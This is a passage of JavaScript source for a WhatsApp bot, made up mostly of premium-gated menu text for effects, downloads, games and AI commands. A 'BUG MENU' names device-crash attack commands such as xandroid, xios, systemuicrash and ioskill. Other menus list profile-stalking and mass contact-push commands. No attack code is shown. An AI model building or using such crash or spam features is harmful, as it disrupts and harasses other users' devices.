${readmore}
┏━『 *\`𝐄 𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}glitchtext*
> *${prefix}writetext*
> *${prefix}advancedglow*
> *${prefix}typographytext*
> *${prefix}pixelglitch*
> *${prefix}neonglitch*
> *${prefix}flagtext*
> *${prefix}flag3dtext*
> *${prefix}deletingtext*
> *${prefix}blackpinkstyle*
> *${prefix}glowingtext*
> *${prefix}underwatertext*
> *${prefix}logomaker*
> *${prefix}cartoonstyle*
> *${prefix}papercutstyle*
> *${prefix}watercolortext*
> *${prefix}effectclouds*
> *${prefix}blackpinklogo*
> *${prefix}gradienttext*
> *${prefix}summerbeach*
> *${prefix}luxurygold*
> *${prefix}multicoloredneon*
> *${prefix}sandsummer*
> *${prefix}galaxywallpaper*
> *${prefix}1917style*
> *${prefix}makingneon*
> *${prefix}royaltext*
> *${prefix}freecreate*
> *${prefix}galaxystyle*
> *${prefix}lighteffects*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐁𝐔𝐆 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}dansyavip*
> *${prefix}dansyacrush*
> *${prefix}xandroid*
> *${prefix}xandroid2*
> *${prefix}systemuicrash*
> *${prefix}xsysui*
> *${prefix}xios*
> *${prefix}xios2*
> *${prefix}xgc*
> *${prefix}ioskill*
> *${prefix}iosx*
> *${prefix}onekill*
> *${prefix}oneclickall*
> *${prefix}xsamsung*
> *${prefix}xwaweb*
> *${prefix}doublekill*
> *${prefix}triplekill*
> *${prefix}💀*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}ping*
> *${prefix}vv*
> *${prefix}paptt*
> *${prefix}totalcmd*
> *${prefix}menu*
> *${prefix}reportbug*
> *${prefix}listpem*
> *${prefix}listpc*
> *${prefix}listgc*
> *${prefix}owner*
> *${prefix}donate*
> *${prefix}obfuscate*
> *${prefix}style*
> *${prefix}say*
> *${prefix}togif*
> *${prefix}toqr*
> *${prefix}bass*
> *${prefix}blown*
> *${prefix}deep*
> *${prefix}earrape*
> *${prefix}fast*
> *${prefix}fat*
> *${prefix}nightcore*
> *${prefix}reverse*
> *${prefix}robot*
> *${prefix}slow*
> *${prefix}smooth*
> *${prefix}squirrel*
> *${prefix}tinyurl*
> *${prefix}tovn*
> *${prefix}toaudio*
> *${prefix}tomp3*
> *${prefix}tomp4*
> *${prefix}toimg*
> *${prefix}tovv*
> *${prefix}sticker*
> *${prefix}take*
> *${prefix}runtime*
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'openaimenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🤖 *𝙊𝙋𝙀𝙉 𝘼𝙄 𝙈𝙀𝙉𝙐* 』${readmore}
> ⚡ *${prefix}LEPTONAI* 
> 🧠 *${prefix}OPENAI*
> 🤖 *${prefix}AI* 
> 🔥 *${prefix}BARD* 
> 🎯 *${prefix}GURU-AI* 
> 🖼️ *${prefix}REALISTIC* 
> 🛠️ *${prefix}BLACKBOXAI*
> 🦙 *${prefix}LAMA-AI* 
> 🌐 *${prefix}BINGAI* 
> 🚀 *${prefix}GPT* 
> ⚙️ *${prefix}GPT2* 
┗━━━━━━━━━━━━━━━━━⊱
`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'stalkermenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🕵️‍♂️ *𝙎𝙏𝘼𝙇𝙆𝙀𝙍 𝙈𝙀𝙉𝙐* 』${readmore}
> 🔍 *${prefix}IGSTALK* 
> 🎵 *${prefix}TTSTALK*
> 💰 *${prefix}YTSTALK* 
> 🎮 *${prefix}MLSTALK* 
> 📦 *${prefix}NPMSTALK* 
> 🐙 *${prefix}GHSTALK* 
┗━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'cpanelmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 *\`𝐂 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔\`* 』
════════════════════${readmore}
> *${prefix}listusr*
> *${prefix}delusr*
> *${prefix}listsrv*
> *${prefix}delsrv*
> *${prefix}tutorial*
> *${prefix}ramlist*
> *${prefix}premlist*
> *${prefix}updatesrv*
> *${prefix}suspend*
> *${prefix}unsuspend*
> *${prefix}createadmin*
> *${prefix}listadmin*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
▭▬▭▬▭( *𝐋𝐈𝐒𝐓 𝐑𝐀𝐌* ▬▭▬▭

.1gb [username,number]
.2gb [username,number]
.3gb [username,number]
.4gb [username,number]
.5gb [username,number]
.6gb [username,number]
.7gb [username,number]
.8gb [username,number]
.unli [username,number]

Example:
.ram username,number
.1gb number, 234xxx
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'gcmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🌐 *𝙂𝙍𝙊𝙐𝙋 𝙈𝙀𝙉𝙐* 』${readmore}  
> 🎉 *${prefix}SETWELCOME* 
> 🚪 *${prefix}SETLEFT* 
> 👋 *${prefix}WELCOME ON/OFF*
> 🔗 *${prefix}ANTILINK* 
> 🔗 *${prefix}LINKGC*
> 📨 *${prefix}INVITE* 
> 🌪️ *${prefix}DISAPPEAR*
> 🗑️ *${prefix}DEL* 
> ❌ *${prefix}SETGCPP* 
> ❌ *${prefix}DELGCPP* 
> ✍️ *${prefix}SETNAME* 
> 📝 *${prefix}SETDESC* 
> ➕ *${prefix}ADD* 
> ❌ *${prefix}KICK* 
> 🔝 *${prefix}PROMOTE* 
> ⬇️ *${prefix}DEMOTE* 
> 🏷️ *${prefix}HIDETAG* 
> 🏷️ *${prefix}TAG* 
> 🏷️ *${prefix}TAGALL* 
> ❌ *${prefix}RESETLINK*
> 🧑‍💻 *${prefix}GETBIO* 
> ✅ *${prefix}VOTE* 
> ⬆️ *${prefix}UPVOTE* 
> ⬇️ *${prefix}DOWNVOTE* 
> ✔️ *${prefix}CHECKVOTE* 
> 🗑️ *${prefix}DELVOTE* 
> 🎨 *${prefix}AUTOSTICKERG*
> 🔞 *${prefix}NSFW* 
┗━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'anonymousmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 🎭 *𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗠𝗘𝗡𝗨* 』${readmore}  
> 💬 *${prefix}ANONYMOUSCHAT*
> 🚦 *${prefix}START*
> 🔄 *${prefix}NEXT* 
> 🛑 *${prefix}STOP* 
> 👤 *${prefix}SENDPROFILE*
> 📝 *${prefix}MENFESS*
> 💭 *${prefix}CONFESS* 
> ✉️ *${prefix}REPLYFESS* 
> 🚫 *${prefix}REFUSEFESS*
> 🛑 *${prefix}STOPMENFESS*
┗━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'ownermenu2': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🔥 OWNER MENU 🔥 』━⊱${readmore}
🚀 > ${prefix}ONLYPC 🖥️
🚀 > ${prefix}ONLYGC 👥
🚀 > ${prefix}SELF 🤖
🚀 > ${prefix}CLEAR 🧹
🚀 > ${prefix}PUBLIC 🌍
🚀 > ${prefix}JOIN 🔗
🚀 > ${prefix}BROADCAST 📢
🚀 > ${prefix}POLL 📊
🚀 > ${prefix}BCIMAGE 🖼️
🚀 > ${prefix}BCVIDEO 🎥
🚀 > ${prefix}CREATEGC 📌
🚀 > ${prefix}SETPACKNAME 🏷️
🚀 > ${prefix}USERJID 🆔
🚀 > ${prefix}SETBOTNAME 🤖✏️
🚀 > ${prefix}SETBOTBIO 📝
🚀 > ${prefix}DELPPBOT ❌🖼️
🚀 > ${prefix}RESTART 🔄
🚀 > ${prefix}SETPPBOT 🖼️✅
🚀 > ${prefix}ADDPREM 💎➕
🚀 > ${prefix}DELPREM 💎❌
🚀 > ${prefix}ADDOWNER 👑➕
🚀 > ${prefix}DELOWNER 👑❌
🚀 > ${prefix}BLOCK 🚫
🚀 > ${prefix}UNBLOCK ✅
🚀 > ${prefix}LEFT 🚪
🚀 > ${prefix}PUSHCONTACT 📲
🚀 > ${prefix}SAVECONTACT 💾
🚀 > ${prefix}SAVECONTACT2 📂
🚀 > ${prefix}GETCONTACT 📇
🚀 > ${prefix}SENDCONTACT 📤
🚀 > ${prefix}JPM 📨
🚀 > ${prefix}JPM2 📩
┗━━━━━━━━━━━━━━━━━`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'gcmenu2': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🏠 *𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨* 』${readmore}  
> 🎉 *${prefix}SETWELCOME* 
> 🚪 *${prefix}SETLEFT* 
> 👋 *${prefix}WELCOME ON/OFF*
> 🔗 *${prefix}ANTILINK* 
> 🔗 *${prefix}LINKGC* 
> 📨 *${prefix}INVITE*
> 🌪️ *${prefix}DISAPPEAR*
> 🗑️ *${prefix}DEL* 
> ❌ *${prefix}SETGCPP*
> ❌ *${prefix}DELGCPP* 
> ✍️ *${prefix}SETNAME* 
> 📝 *${prefix}SETDESC* 
> ➕ *${prefix}ADD*
> ❌ *${prefix}KICK* 
> 🔝 *${prefix}PROMOTE* 
> ⬇️ *${prefix}DEMOTE* 
> 🏷️ *${prefix}HIDETAG*
> 🏷️ *${prefix}TAG* 
> 🏷️ *${prefix}TAGALL*
> ❌ *${prefix}RESETLINK*
> 🧑‍💻 *${prefix}GETBIO*
> ✅ *${prefix}VOTE* 
> ⬆️ *${prefix}UPVOTE*
> ⬇️ *${prefix}DOWNVOTE*
> ✔️ *${prefix}CHECKVOTE*
> 🗑️ *${prefix}DELVOTE*
> 🎨 *${prefix}AUTOSTICKERG*
> 🔞 *${prefix}NSFW*
┗━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'ephoto360menu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 📸 *𝗘𝗽𝗵𝗼𝘁𝗼 𝗠𝗘𝗡𝗨* 』${readmore}
> 🌟 *${prefix}GLITCHTEXT* 
> ✍️ *${prefix}WRITETEXT* 
> 💡 *${prefix}ADVANCEDGLOW*
> 🅾️ *${prefix}TYPOGRAPHYTEXT*
> 🖤 *${prefix}PIXELGLITCH* 
> 🌈 *${prefix}NEONGLITCH* 
> 🚨 *${prefix}FLAGTEXT* 
> 🇺🇳 *${prefix}FLAG3DTEXT*  
> 🧨 *${prefix}DELETINGTEXT*
> 🎀 *${prefix}BLACKPINKSTYLE*
> 💫 *${prefix}GLOWINGTEXT*
> 🌊 *${prefix}UNDERWATERTEXT*
> 🏷️ *${prefix}LOGOMAKER*
> 🎨 *${prefix}CARTOONSTYLE*
> ✂️ *${prefix}PAPERCUTSTYLE* 
> 🎨 *${prefix}WATERCOLORTEXT* 
> ☁️ *${prefix}EFFECTCLOUDS* 
> 🖤 *${prefix}BLACKPINKLOGO*
> 🌈 *${prefix}GRADIENTTEXT* 
> 🌞 *${prefix}SUMMERBEACH* 
> 🏆 *${prefix}LUXURYGOLD*
> 🌟 *${prefix}MULTICOLOREDNEON* 
> 🏖️ *${prefix}SANDSUMMER* 
> 🌌 *${prefix}GALAXYWALLPAPER* 
> 🕰️ *${prefix}1917STYLE* 
> 🔮 *${prefix}MAKINGNEON* 
> 👑 *${prefix}ROYALTEXT* 
> ✨ *${prefix}FREECREATE* 
> 🌠 *${prefix}GALAXYSTYLE* 
> 💡 *${prefix}LIGHTEFFECTS* 
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'pushmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 📱 *𝗣𝗨𝗦𝗛 𝗠𝗘𝗡𝗨* 』━━◧${readmore}  
> 🔍 *${prefix}CEKIDGC* 
> 📞 *${prefix}PUSHCONTACT*   
> 💾 *${prefix}SAVECONTACT*
> 💾 *${prefix}SAVECONTACT2*
> 📲 *${prefix}GETCONTACT* 
> ✉️ *${prefix}SENDCONTACT* 
> 📤 *${prefix}JPM* 
> 📥 *${prefix}JPM2* 
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'downloadmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 📥 *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨* 』${readmore}  
> 🎥 *${prefix}TIKTOK*
> 🎞️ *${prefix}TIKTOKSLIDE* 
> 🎶 *${prefix}TIKTOKAUDIO* 
> 🔍 *${prefix}YTSEARCH*
> 🔎 *${prefix}TTSEARCH*
> 🎵 *${prefix}PLAY/SONG/MUSIC* 
> 🎥 *${prefix}YTMP3* 
> 🎬 *${prefix}YTMP4*
> 🎬 *${prefix}IMDB* 
> 🌤️ *${prefix}WEATHER*
> 📸 *${prefix}INSTAGRAM*
> 📱 *${prefix}FACEBOOK* 
> 🐦 *${prefix}TWITTERVID*
> 📡 *${prefix}TELESTICK*
> 🎧 *${prefix}SPOTIFY* 
> 🖥️ *${prefix}GITCLONE* 
> 😊 *${prefix}HAPPYMOD*   
> 📌 *${prefix}PINTEREST* 
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'gamemenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya =`『 🎮 *𝗚𝗔𝗠𝗘 𝗠𝗘𝗡𝗨* 』${readmore}  
> ❓ *${prefix}GUESS*
> 🧩 *${prefix}RIDDLES* 
> 🎶 *${prefix}LYRICGAME*
> 🖼️ *${prefix}PICGUESS* 
> 🎵 *${prefix}SONGGUESS* 
> ⚗️ *${prefix}CHEMISTRY* 
> ⭕ *${prefix}TICTACTOE* 
> 🗣️ *${prefix}TEASE*
> 🔍 *${prefix}WHOAMI* 
> 🔠 *${prefix}WORD* 
> 🧩 *${prefix}PUZZLE*
> 🚩 *${prefix}FLAGGUESS* 
> 🚩 *${prefix}FLAGGUESSV2* 
> 🏙️ *${prefix}DISTRICT* 
> 🍰 *${prefix}CAKLONTONG* 
> 🐺 *${prefix}WEREWOLF* 
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'rpgmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🏰 *𝗥𝗣𝗚 𝗠𝗘𝗡𝗨* 』${readmore}  
> 💼 *${prefix}WORK*
> 🐉 *${prefix}DRAGON* 
> 🐱 *${prefix}FIGHTCAT*
> 🦅 *${prefix}PHOENIX*
> 🦄 *${prefix}GRIFFIN* 
> 🦊 *${prefix}KYUBI* 
> 🦄 *${prefix}CENTAUR* 
> 💾 *${prefix}SAVE* 
> ⛏️ *${prefix}MINING*
> 💰 *${prefix}BANK* 
> 🦹‍♂️ *${prefix}THIEF*
> 💵 *${prefix}SAVINGS* 
> 💸 *${prefix}WITHDRAW* 
> 🌱 *${prefix}GARDENING* 
> ⚒️ *${prefix}CRAFTING* 
> 🎲 *${prefix}BET* 
> 🎁 *${prefix}BONUS* 
> 🍎 *${prefix}FRUIT* 
> ⬇️ *${prefix}DOWN*
> 🧑‍🔧 *${prefix}ASSIST*  
> 🚖 *${prefix}TAXI* 
> ☁️ *${prefix}GLOOMY*
> 🦅 *${prefix}HUNT*
> 👮‍♂️ *${prefix}POLISI*
> ⚖️ *${prefix}TRADE*
> 🧳 *${prefix}ROB* 
> ⚔️ *${prefix}KILL* 
> 🛒 *${prefix}COLLECT*
> 🎣 *${prefix}FISHING*
> 🔧 *${prefix}REPAIR* 
> 🍖 *${prefix}FEED* 
> ⚔️ *${prefix}FIGHT*
> 💵 *${prefix}PAYDAY*
> 🔧 *${prefix}UPGRADE* 
> 💸 *${prefix}TRANSFER*   
> 🛍️ *${prefix}SHOP* 
> 🎮 *${prefix}SELECTSKILL* 
> 🗑️ *${prefix}RUBBISH*
> 🚀 *${prefix}ROCKET*
> 🚴 *${prefix}BIKE* 
> 👫 *${prefix}HANGOUT*
> 🏪 *${prefix}MARKET* 
> 💥 *${prefix}ROBBERY* 
> 📈 *${prefix}REFERRAL* 
> 🐕 *${prefix}PETSHOP* 
> 🏊‍♂️ *${prefix}POOL*
> 🤠 *${prefix}COWBOY* 
> 🏆 *${prefix}LEADERBOARD* 
> 🎰 *${prefix}CASINO* 
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'aimenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 *\`𝐎𝐏𝐄𝐍 𝐀𝐈 𝐌𝐄𝐍𝐔\`* 』${readmore}  
╭─┴❍「 🧠 OpenAI 」❍  
│ *${prefix}blackboxai* 🖤 
│ *${prefix}travel-assistant* 🌍 
│ *${prefix}realistic* 🌟 
│ *${prefix}mangaimg* 📚 
│ *${prefix}animeimg* 🎥 
│ *${prefix}lexica* 📖
│ *${prefix}chechkgpt* 🔍
│ *${prefix}3dmodel* 🏗️
│ *${prefix}photoleap* 📸 
│ *${prefix}chatgpt4* 💬
│ *${prefix}darky* 🌑 
│ *${prefix}bing* 🌐 
│ *${prefix}mathsai* ➗ 
│ *${prefix}openai* 🧠
│ *${prefix}dalle* 🖼️ 
│ *${prefix}stablediffusion* 💫
│ *${prefix}ai* 🤖
│ *${prefix}chatgpt* 💬
╰──────❍  
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'funmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 *\`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』${readmore}
> 😂 *${prefix}SMEME*
> 💑 *${prefix}PPCOUPLE*
> 📖 *${prefix}DEFINE*
> 🏆 *${prefix}QC*
> 🎤 *${prefix}LYRICS*
> 🎩 *${prefix}SUIT*
> ➗ *${prefix}MATH*
> ❌⭕ *${prefix}TICTACTOE*
> 🧠 *${prefix}FACT*
> 🤔 *${prefix}TRUTH*
> 😜 *${prefix}DARE*
> 💑 *${prefix}COUPLE*
> ❤️ *${prefix}SOULMATE*
> 🤪 *${prefix}STUPIDCHECK*
> 😎 *${prefix}HANDSOMECHECK*
> 💦 *${prefix}UNCLEANCHECK*
> 🔥 *${prefix}HOTCHECK*
> 🧠 *${prefix}SMARTCHECK*
> 💪 *${prefix}GREATCHECK*
> 😈 *${prefix}EVILCHECK*
> 🐶 *${prefix}DOGCHECK*
> 😎 *${prefix}COOLCHECK*
> 💘 *${prefix}WAIFUCHECK*
> 🌟 *${prefix}AWESOMECHECK*
> 🏳️‍🌈 *${prefix}GAYCHECK*
> 💕 *${prefix}CUTECHECK*
> 🌈 *${prefix}LESBIANCHECK*
> 🔥 *${prefix}HORNYCHECK*
> 😍 *${prefix}PRETTYCHECK*
> 💖 *${prefix}LOVELYCHECK*
> 🤢 *${prefix}UGLYCHECK*
> 🎲 *${prefix}PICK*
> 💬 *${prefix}QUOTES*
> ❓ *${prefix}CAN*
> ❔ *${prefix}IS*
> 🕰️ *${prefix}WHEN*
> 🌍 *${prefix}WHERE*
> 🤷‍♀️ *${prefix}WHAT*
> ❓ *${prefix}HOW*
> ⭐ *${prefix}RATE*
> 😢 *${prefix}CRY*
> 💀 *${prefix}KILL*
> 🤗 *${prefix}HUG*
> 🤲 *${prefix}PAT*
> 👅 *${prefix}LICK*
> 💋 *${prefix}KISS*
> 🐾 *${prefix}BITE*
> 💨 *${prefix}YEET*
> 🏋️ *${prefix}BULLY*
> 🤕 *${prefix}BONK*
> 😉 *${prefix}WINK*
> 🧸 *${prefix}POKE*
> 🍽️ *${prefix}NOM*
> 🖐️ *${prefix}SLAP*
> 😊 *${prefix}SMILE*
> 👋 *${prefix}WAVE*
> 🐾 *${prefix}AWOO*
> 😳 *${prefix}BLUSH*
> 😏 *${prefix}SMUG*
> 🤗 *${prefix}GLOMP*
> 😄 *${prefix}HAPPY*
> 💃 *${prefix}DANCE*
> 🤡 *${prefix}CRINGE*
> 🤗 *${prefix}CUDDLE*
> ✋ *${prefix}HIGHFIVE*
> 🤩 *${prefix}SHINOBU*
> 🤝 *${prefix}HANDHOLD*
> 👋 *${prefix}SPANK*
> 😄 *${prefix}TICKLE*
> 🖼️ *${prefix}AVATAR*
> 🍽️ *${prefix}FEED*
> 🦊 *${prefix}FOXGIRL*
> 🎶 *${prefix}GECG*
> ✅ *${prefix}CHECKME*
> 🎵 *${prefix}SOUND1 - SOUND161*
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'randomphotomenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 *\`𝐑𝐀𝐍𝐃𝐎𝐌𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔\` 』${readmore}
> 🖼️ *${prefix}AESTHETIC*
> 🌆 *${prefix}WALLPAPER*
> 🎨 *${prefix}ART*
> 🎤 *${prefix}BTS*
> 🎱 *${prefix}8BALLPOOL*
> 👗 *${prefix}COSPLAY*
> 💻 *${prefix}HACKER*
> 🖥️ *${prefix}CYBER*
> 🎮 *${prefix}GAMEWALLPAPER*
> 🕌 *${prefix}ISLAMIC*
> 👹 *${prefix}CARTOON*
> 🍡 *${prefix}PENTOL*
> 🐱 *${prefix}CAT*
> 🎶 *${prefix}KPOP*
> 👨‍👩‍👧 *${prefix}EXO*
> 💃 *${prefix}LISA*
> 🌌 *${prefix}SPACE*
> 🚗 *${prefix}CAR*
> 🔧 *${prefix}TECHNOLOGY*
> 🚲 *${prefix}BIKE*
> 📝 *${prefix}SHORTQUOTE*
> 🖥️ *${prefix}HACKING*
> 🌹 *${prefix}ROSE*
